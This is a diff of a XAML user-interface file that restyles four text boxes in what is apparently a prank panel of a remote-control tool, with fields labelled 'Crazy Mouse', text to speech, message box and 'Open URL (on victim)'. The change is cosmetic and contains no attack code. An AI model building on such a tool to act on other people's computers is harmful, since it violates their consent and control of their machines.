@@ -288,7 +288,7 @@
                                 </StackPanel>
                                 <StackPanel Orientation="Horizontal">
                                     <TextBox x:Name="TxtCrazyMouseSec" Text="10" Width="40" Height="28"
-                                             Background="{DynamicResource SidebarCtrlBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
+                                             Background="{DynamicResource InputBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
                                              BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="1"
                                              Padding="4,3" FontFamily="Consolas" FontSize="11"
                                              Margin="0,0,4,0"
@@ -308,7 +308,7 @@
                                     <TextBlock x:Name="LblFunTts" Text="Text to Speech" Style="{StaticResource SectionLabel}" Margin="0"/>
                                 </StackPanel>
                                 <TextBox x:Name="TxtSpeak" Text="Hello World"
-                                         Background="{DynamicResource SidebarCtrlBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
+                                         Background="{DynamicResource InputBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
                                          BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="1"
                                          Padding="6,4" FontFamily="Consolas" FontSize="11"
                                          Margin="0,0,0,6" Height="28" VerticalContentAlignment="Center"
@@ -325,7 +325,7 @@
                                     <TextBlock x:Name="LblFunMsgbox" Text="Message Box" Style="{StaticResource SectionLabel}" Margin="0"/>
                                 </StackPanel>
                                 <TextBox x:Name="TxtMsgBox" Text="Surprise!"
-                                         Background="{DynamicResource SidebarCtrlBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
+                                         Background="{DynamicResource InputBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
                                          BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="1"
                                          Padding="6,4" FontFamily="Consolas" FontSize="11"
                                          Margin="0,0,0,6" Height="28" VerticalContentAlignment="Center"
@@ -342,7 +342,7 @@
                                     <TextBlock x:Name="LblFunOpenUrl" Text="Open URL (on victim)" Style="{StaticResource SectionLabel}" Margin="0"/>
                                 </StackPanel>
                                 <TextBox x:Name="TxtUrl" Text="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-                                         Background="{DynamicResource SidebarCtrlBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
+                                         Background="{DynamicResource InputBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
                                          BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="1"
                                          Padding="6,4" FontFamily="Consolas" FontSize="10"
                                          Margin="0,0,0,6" Height="26" VerticalContentAlignment="Center"
